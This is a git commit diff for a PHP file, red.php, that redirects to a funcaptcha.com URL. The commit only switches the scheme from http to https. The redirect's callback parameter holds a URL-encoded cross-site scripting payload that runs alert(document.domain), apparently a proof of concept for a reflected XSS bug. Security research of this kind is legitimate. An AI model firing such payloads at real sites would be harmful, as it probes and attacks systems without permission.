782785ce302b0d3c12abf2c53fcc1ddf37d70278
missoum1307 <missoum1307@users.noreply.github.com>
2018-09-13 02:23:00 +0100

    Update red.php

--- red.php
+++ red.php
@@ -1,1 +1,1 @@
-<?php header('Location: http://funcaptcha.com/fc/a/?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E'); ?> 
+<?php header('Location: https://funcaptcha.com/fc/a/?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E'); ?> 
